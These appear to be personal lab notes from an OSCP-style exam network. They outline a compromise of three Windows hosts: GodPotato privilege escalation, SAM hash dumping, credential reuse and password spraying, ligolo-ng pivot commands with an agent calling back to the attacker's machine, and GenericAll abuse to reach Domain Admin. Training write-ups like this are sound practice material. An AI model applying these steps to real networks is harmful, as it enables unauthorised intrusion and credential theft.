## 192.168.144.206 
nmap 
![[Screenshot 2026-01-17 at 5.08.44 PM.png]]

nxc 
![[Screenshot 2026-01-17 at 4.08.30 PM.png]]
Users 
![[Screenshot 2026-01-17 at 4.15.34 PM.png]]
DC20.oscp.exam - 172.16.144.206 
Groups 

interactive evil-wimrm shell 
![[Screenshot 2026-01-17 at 7.58.39 PM.png]]
whoami /priv 

![[Screenshot 2026-01-17 at 7.58.25 PM.png]]

SeImpersonate = GodPotato 
BeichenDream/GodPotato release 4 : https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe 

upload via evilwinrm shel 
![[Screenshot 2026-01-17 at 8.22.34 PM.png]]


![[Screenshot 2026-01-17 at 9.36.52 PM.png]]


Proof.txt 
![[Screenshot 2026-01-17 at 9.41.20 PM.png]]

![[Screenshot 2026-01-17 at 9.39.40 PM.png]]
Sam system 
![[Screenshot 2026-01-17 at 9.45.05 PM.png]]
samdump2 for recovered hashes 
![[Screenshot 2026-01-17 at 9.50.07 PM.png]]![[Screenshot 2026-01-17 at 9.50.38 PM.png]]

copy backup.zip to r.andrews so I can move to my local kali box 

![[Screenshot 2026-01-17 at 10.56.47 PM.png]]
![[Screenshot 2026-01-17 at 10.59.38 PM.png]]

![[Screenshot 2026-01-17 at 11.00.00 PM.png]]
![[Screenshot 2026-01-17 at 11.00.10 PM.png]]

![[Screenshot 2026-01-17 at 10.59.29 PM.png]]

![[Screenshot 2026-01-17 at 10.59.15 PM.png]]

backup.zip password is myspace1 

web.config has credentials 
![[Screenshot 2026-01-17 at 11.01.06 PM.png]]

Set up proxy using ligolo-ng 
```
ligolo-proxy -selfcert 
```

![[Screenshot 2026-01-18 at 11.14.30 AM.png]]

```
sudo ip tuntap add user makayla mode tun ligolo
sudo ip link set ligolo up 
ip a 

```

![[Screenshot 2026-01-18 at 11.15.55 AM.png]]
```
GOOS=windows GOARCH=amd64 go build -o agent.exe -ldflags-"-s -w" cmd/agent/main.go 
```

![[Screenshot 2026-01-18 at 11.17.31 AM.png]]

```
sudo ip route add 172.16.144.0/24 dev ligolo 
sudo ip route list 
```
![[Screenshot 2026-01-17 at 11.14.55 PM.png]]

upload agent via winrm 
![[Screenshot 2026-01-18 at 11.20.37 AM.png]]
rdp and run agent 
![[Screenshot 2026-01-18 at 11.21.11 AM.png]]

```
.\agent.exe -connect 192.168.49.144:11601 -ignore-cert 
```

![[Screenshot 2026-01-18 at 11.23.27 AM.png]]

ligolo-ng session then start 

![[Screenshot 2026-01-18 at 11.24.13 AM.png]]


![[Screenshot 2026-01-17 at 11.31.01 PM.png]]

connectivity confirmation 
![[Screenshot 2026-01-18 at 11.26.02 AM.png]]
## 172.16.144.202 
nmap scan 
![[Screenshot 2026-01-18 at 11.45.47 AM.png]]


![[Screenshot 2026-01-17 at 11.30.41 PM.png]]
Download scripts/tasks.vbs 

![[Screenshot 2026-01-17 at 11.33.15 PM.png]]
![[Screenshot 2026-01-17 at 11.34.09 PM.png]]
Bloodhound enumeration 
ls![[Screenshot 2026-01-17 at 11.35.30 PM.png]]

Got users from smb or r.andrews users dump from earlier 
![[Screenshot 2026-01-17 at 11.39.59 PM.png]]
username dictionary attack to find matching user to discovered password. 
![[Screenshot 2026-01-17 at 11.42.28 PM.png]]

Shell as c.rogers 
![[Screenshot 2026-01-17 at 11.43.55 PM.png]]


![[Screenshot 2026-01-17 at 11.45.18 PM.png]]

## 172.16.144.200 (DC)

rogers user privleges ![[Screenshot 2026-01-17 at 11.49.37 PM.png]]
https://www.hackingarticles.in/genericall-active-directory-abuse/ 
Rogers bloodhound json outputs show GenericAll 
![[Screenshot 2026-01-18 at 11.38.48 AM.png]]
Add himself to Domain Admin group in oscp.exam domain 
![[Screenshot 2026-01-17 at 11.55.19 PM.png]]
Login to 200 (DC) 
![[Screenshot 2026-01-17 at 11.56.08 PM.png]]
Proof.txt 
![[Screenshot 2026-01-17 at 11.56.56 PM.png]]